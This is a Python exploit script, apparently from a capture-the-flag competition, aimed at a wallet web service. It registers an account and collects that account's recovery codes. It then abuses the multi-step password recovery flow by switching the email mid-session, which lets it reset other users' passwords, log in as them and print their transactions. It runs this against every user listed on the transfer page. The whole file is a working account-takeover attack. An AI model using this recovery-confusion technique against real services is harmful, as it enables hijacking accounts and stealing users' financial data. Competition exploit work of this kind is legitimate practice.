import random
import re
import string
import requests
import bs4


def get_absolute_url_from_relative(url, main_url, proto="https", ):
    if url.startswith(proto):
        return url
    if not url.startswith("/"):
        url = "/" + url
    return main_url + url


def random_string(chars=string.ascii_letters + string.digits, count=8, first_uppercase=False):
    result = ''.join([random.choice(chars) for _ in range(count)])
    if first_uppercase and len(result) > 0:
        result = result[0].upper() + result[1:]
    return result


def create_user(domain):
    session = requests.Session()
    username = f"{random_string(count=random.randint(8, 12))}_{random_string(count=random.randint(8, 12))}"
    email = f"{username}@{random_string(count=random.randint(4, 8))}.{random_string(count=random.randint(2, 3))}"
    password = random_string(count=random.randint(8, 12))
    r = session.post(
        f"https://{domain}/signup",
        data={"username": username, "email": email, "password": password, "confirm_password": password}
    )

    secret_codes = {}
    soup = bs4.BeautifulSoup(r.content, "html.parser")
    number = ""

    for td in soup.find("table").find_all('td'):
        if not number:
            number = td.text
        else:
            secret_codes[number] = td.text
            number = ""
    # self.mumble_if_false(50 == len(secret_codes), "Invalid format of response on POST /signup")
    # logging.info(f"Created user with username {username}")
    return {
        "session": session,
        "username": username,
        "email": email,
        "password": password,
        "secret_codes": secret_codes
    }


def get_other_email(domain, session):
    start_transfer = session.get(f"https://{domain}/transfer")
    soup = bs4.BeautifulSoup(start_transfer.content, "html.parser")
    other_emails = []
    for option in soup.findAll('option'):
        other_emails.append(option.text)
    return other_emails


def exploit(domain, main_user, targe_email):
    session = requests.Session()
    recovery_step_1 = session.post(
        f"https://{domain}/recovery",
        data={"email": main_user['email'], "step": 1}
    )
    recovery_step_2 = session.post(
        f"https://{domain}/recovery",
        data={"recovery_type": "code", "step": 2}
    )
    soup_2 = bs4.BeautifulSoup(recovery_step_2.content, "html.parser")
    input_label = soup_2.find(attrs={"for": "code"})
    secret_code_number = str(re.search(r'\d+', input_label.text).group())
    password = random_string()
    session.post(
        f"https://{domain}/recovery",
        data={"email": targe_email, "step": 1}
    )
    recovery_step_3 = session.post(
        f"https://{domain}/recovery",
        data={
            "step": "3",
            "code": main_user['secret_codes'][secret_code_number],
            "password": password
        }
    )
    r = session.post(
        f"https://{domain}/signin",
        data={"email": targe_email, "password": password}
    )
    get_transactions = session.get(f"https://{domain}/transactions")
    soap = bs4.BeautifulSoup(get_transactions.content, "html.parser")
    for tr in soap.findAll('tr'):
        if 'td' in str(tr):
            print(tr.findAll("td")[3].text)


if __name__ == "__main__":
    domain_name = "wallet.team1.ctf.hitb.org"
    main_user = create_user(domain_name)
    for email in get_other_email(domain_name, main_user['session']):
        print(email)
        exploit(domain_name, main_user, email)
